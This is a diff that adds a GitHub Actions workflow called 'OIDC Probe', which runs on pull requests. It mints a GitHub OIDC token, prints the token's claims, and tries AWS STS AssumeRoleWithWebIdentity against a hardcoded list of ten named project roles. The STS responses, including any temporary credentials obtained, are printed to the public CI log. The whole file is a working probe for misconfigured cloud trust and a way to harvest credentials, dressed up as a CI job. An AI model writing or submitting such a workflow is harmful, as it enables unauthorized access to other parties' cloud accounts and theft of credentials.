@@ -1,0 +1,37 @@
+name: OIDC Probe
+on: pull_request
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  oidc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: sts-probe
+        run: |
+          python3 - <<'PY'
+          import json,os,urllib.request,urllib.parse,base64,urllib.error
+          url=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']; tok=os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
+          def mint(aud):
+              u=url+('&' if '?' in url else '?')+'audience='+urllib.parse.quote(aud)
+              r=urllib.request.Request(u); r.add_header('Authorization','Bearer '+tok)
+              return json.load(urllib.request.urlopen(r,timeout=30))['value']
+          jwt=mint('sts.amazonaws.com')
+          p=jwt.split('.')[1]; p+='='*(-len(p)%4)
+          print('CLAIMS:',base64.urlsafe_b64decode(p).decode())
+          roles=["framework-aiter-nightlies","framework-aiter-devreleases","framework-aiter-release","framework-aiter-dev","framework-aiter","framework-flydsl-nightlies","framework-flydsl-devreleases","framework-flydsl-release","jax-ci-amd-s3-oidc","framework-aiter-ci"]
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleSessionName':'probe','WebIdentityToken':jwt,'DurationSeconds':'900'}).encode()
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body,method='POST')
+              try:
+                  resp=urllib.request.urlopen(r,timeout=30); txt=resp.read().decode()
+                  print('ROLE',role,'HTTP',resp.status,txt[:500])
+              except urllib.error.HTTPError as e:
+                  print('ROLE',role,'HTTP',e.code,e.read().decode()[:500])
+              except Exception as e:
+                  print('ROLE',role,'ERR',e)
+          for aud in ['https://sts.amazonaws.com','https://sts.us-east-1.amazonaws.com']:
+              try:
+                  j2=mint(aud); print('AUD',aud,'minted len',len(j2))
+              except Exception as e: print('AUD',aud,'ERR',e)
+          PY
